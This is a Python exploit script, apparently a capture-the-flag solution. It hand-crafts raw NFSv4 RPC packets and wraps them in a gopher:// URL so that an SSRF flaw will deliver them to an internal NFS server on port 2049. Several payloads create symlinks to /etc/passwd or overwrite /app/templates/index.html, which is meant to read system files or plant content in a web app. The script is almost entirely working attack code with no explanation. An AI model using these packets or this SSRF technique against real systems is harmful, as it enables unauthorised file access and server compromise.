CREATE_SESSION_PAYLOAD = b'\x80\x00\x00\xcc\x03*\x07A\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa3\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x0c9a59b49f3c4f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00+\x07\x11\xaba6v\x84\xdd\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x04\x14\x00\x10\x03\x88\x00\x00\x1d\xa0\x00\x00\x00\x08\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x10\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\xce\xac\xc7\x83\x00\x00\x00\x0c9a59b49f3c4f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

EXCHANGE_ID = b'\x80\x00\x00\xf0\x01*\x07A\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa3\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x0c9a59b49f3c4f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00*\x16\xbd\x9a:\xce\xac\xc7\x83\x00\x00\x00\x1aLinux NFSv4.2 9a59b49f3c4f\x00\x00\x00\x00\x01\x03\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\nkernel.org\x00\x00\x00\x00\x00ALinux 5.10.43-1-lts #1 SMP Thu, 10 Jun 2021 12:32:16 +0000 x86_64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

GET_FH = b'\x80\x00\x00\xac\x92*\x07A\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa3\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x0c9a59b49f3c4f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x005\x07\x11\xaba6v\x84\xdd\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x00\x00\x00\x1c\x01\x00\x07\x00\x01@n\x00\x00\x00\x00\x00\x9d\xea7\xc4\x80\x16C\xa6\x88\x86i#t\x1c\x9e\x1b\x00\x00\x00\t\x00\x00\x00\x02\x00\x10\x01\x1a\x00\xb0\xa2:'

CREATE_FILE = b'\x80\x00\x00\xf0\\\x7f\xd3k\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa3\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x0c6aa72f45a6ad\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x005\x07\x11\xaba=v\x84\xdd\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x16\x00\x00\x00\x1c\x01\x00\x07\x00\x01@n\x00\x00\x00\x00\x00\x9d\xea7\xc4\x80\x16C\xa6\x88\x86i#t\x1c\x9e\x1b\x00\x00\x00\x06\x00\x00\x00\x05\x00\x00\x00\x08/tmp/kms\x00\x00\x00\x0bsicemedeetz\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x08\x00\x00\x01\xff\x00\x00\x00\x12\x00\x00\x00\n\x00\x00\x00\t\x00\x00\x00\x02\x00\x10\x01\x1a\x00\xb0\xa2:'

CREATE_FILE = b'\x80\x00\x00\xf0\\\x7f\xd3k\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa3\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x0c6aa72f45a6ad\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x16\x00\x00\x00\x1c\x01\x00\x07\x00\x01@n\x00\x00\x00\x00\x00\x9d\xea7\xc4\x80\x16C\xa6\x88\x86i#t\x1c\x9e\x1b\x00\x00\x00\x06\x00\x00\x00\x05\x00\x00\x00\x08/tmp/kms\x00\x00\x00\x0bsicemedeetz\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x08\x00\x00\x01\xff\x00\x00\x00\x12\x00\x00\x00\n\x00\x00\x00\t\x00\x00\x00\x02\x00\x10\x01\x1a\x00\xb0\xa2:'

MNT_CALL = b'\xc6CX\xb4\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa5\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x0c6aa72f45a6ad\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05/data\x00\x00\x00'

CREATE_FILE2 = b'\x80\x00\x00\xc0\xber\xdc\xe9\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa3\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x0c6aa72f45a6ad\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x16\x00\x00\x00\x1c\x01\x00\x07\x00\x01@n\x00\x00\x00\x00\x00\x9d\xea7\xc4\x80\x16C\xa6\x88\x86i#t\x1c\x9e\x1b\x00\x00\x00\x06\x00\x00\x00\x05\x00\x00\x00\x08/tmp/kms\x00\x00\x00\x07wtfgang\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x01\xff\x00\x00\x00\n\x00\x00\x00\t\x00\x00\x00\x02\x00\x10\x01\x1a\x00\xb0\xa2:'

CREATE_FILE3 = b'\x80\x00\x00\xc0\xdbr\xdc\xe9\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa3\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x0c6aa72f45a6ad\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x16\x00\x00\x00\x1c\x01\x00\x07\x00\x01@n\x00\x00\x00\x00\x00\x9d\xea7\xc4\x80\x16C\xa6\x88\x86i#t\x1c\x9e\x1b\x00\x00\x00\x06\x00\x00\x00\x05\x00\x00\x00\x0b/etc/passwd\x00\x00\x00\x00\x03kms\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x01\xff\x00\x00\x00\n\x00\x00\x00\t\x00\x00\x00\x02\x00\x10\x01\x1a\x00\xb0\xa2:'[:-20] + b'A'*20

CREATE_FILE3 = b'\x80\x00\x00\xc0\xdbr\xdc\xe9\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa3\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x0c6aa72f45a6ad\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x16\x00\x00\x00\x1c\x01\x00\x07\x00\x01@n\x00\x00\x00\x00\x00\x9d\xea7\xc4\x80\x16C\xa6\x88\x86i#t\x1c\x9e\x1b\x00\x00\x00\x06\x00\x00\x00\x05\x00\x00\x00\x0b/etc/passwd\x00\x00\x00\x00\x03kms\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x01\xffAAAAAAAAAAAAAAAAAAAA'

CREATE_FILE3 = b'\xdbr\xdc\xe9\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa3\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x0c6aa72f45a6ad\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x18\x00\x00\x00\x0f\x00\x00\x00\x04data\x00\x00\x00\x06\x00\x00\x00\x05\x00\x00\x00\x19/app/templates/index.html\x00\x00\x00\x00\x00\x00$bb51bf1fa9845e7d807b41487ad22cd2.jpg\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x01\xff\x00\x00\x00\x12'
print(hex(len(CREATE_FILE3)))

IP = "nfs.server"
prefix = f"gopher://{IP}:2049/_"

def encode(data, _SEQ=0):
    deet = ""

    data = b"\x80\x00\x00" + bytes([len(data)]) + data 
    data = bytearray(data)
    # data[111] = _SEQ
    print(data)

    for idx, b in enumerate(data):
        deet += f"%{hex(b)[2:].rjust(2, '0')}"
    return prefix+deet

#http://hax.perfect.blue/siceme
# print(encode(EXCHANGE_ID))
# print(encode(CREATE_SESSION_PAYLOAD))
SEQ = 0x8a
# print(encode(GET_FH, SEQ))
# SEQ += 1
print(encode(CREATE_FILE3, SEQ))

